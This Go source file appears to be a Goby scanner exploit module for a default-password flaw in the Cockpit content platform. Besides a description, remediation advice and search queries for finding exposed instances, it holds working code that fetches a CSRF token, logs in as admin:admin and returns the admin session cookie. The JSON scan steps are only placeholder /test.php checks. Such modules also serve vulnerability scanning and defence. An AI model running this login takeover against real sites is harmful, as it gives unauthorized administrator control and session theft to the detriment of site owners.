package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Cockpit Default Password Vulnerability",
    "Description": "<p>Cockpit is a self-hosted, flexible and user-friendly headless content platform for creating custom digital experiences.</p><p>The default password vulnerability in the Cockpit allows attackers to take control of the entire platform and operate core functions with administrator rights.</p>",
    "Product": "cockpit",
    "Homepage": "http://getcockpit.com",
    "DisclosureDate": "2023-03-07",
    "Author": "sunying",
    "FofaQuery": "title=\"Authenticate Please!\" || header=\"Cockpit_\" || banner=\"Cockpit_\" || body=\"Cockpit/assets/cockpit.js\"",
    "GobyQuery": "title=\"Authenticate Please!\" || header=\"Cockpit_\" || banner=\"Cockpit_\" || body=\"Cockpit/assets/cockpit.js\"",
    "Level": "2",
    "Impact": "<p>attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "login",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Cockpit 内容平台默认口令漏洞",
            "Product": "cockpit",
            "Description": "<p>Cockpit 是一个自托管、灵活且用户友好的无头内容平台，用于创建自定义数字体验。</p><p>Cockpit 存在默认口令漏洞，攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。\t<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Cockpit Default Password Vulnerability",
            "Product": "cockpit",
            "Description": "<p>Cockpit is a self-hosted, flexible and user-friendly headless content platform for creating custom digital experiences.</p><p>The default password vulnerability in the Cockpit allows attackers to take control of the entire platform and operate core functions with administrator rights.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-21",
    "PocId": "10839"
}`
	loginFlagIS95s01xcv := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		getCSRFRequestConfig := httpclient.NewGetRequestConfig("/auth/login?to=/")
		getCSRFRequestConfig.VerifyTls = false
		getCSRFRequestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, getCSRFRequestConfig)
		if err != nil {
			return nil, err
		}
		csrfResults := regexp.MustCompile(`csfr\s*:\s*"(.+?)"`).FindStringSubmatch(resp.RawBody)
		if len(csrfResults) < 2 {
			return nil, errors.New("漏洞利用失败")
		}
		loginRequestConfig := httpclient.NewPostRequestConfig("/auth/check")
		loginRequestConfig.VerifyTls = false
		loginRequestConfig.FollowRedirect = false
		loginRequestConfig.Header.Store("Content-Type", "application/json")
		loginRequestConfig.Data = `{"auth":{"user":"admin", "password": "admin"}, "csfr": "` + csrfResults[1] + `"}`
		return httpclient.DoHttpRequest(hostInfo, loginRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, _ := loginFlagIS95s01xcv(hostInfo)
			success := resp != nil && strings.Contains(resp.RawBody, `"success":true`)
			if success {
				ss.VulURL = hostInfo.Scheme() + `://admin:admin@` + hostInfo.HostInfo
			}
			return success
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "login" {
				resp, err := loginFlagIS95s01xcv(expResult.HostInfo)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp != nil && strings.Contains(resp.RawBody, `"success":true`) {
					expResult.Success = true
					expResult.Output = `Cookie: ` + resp.Cookie
				}
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}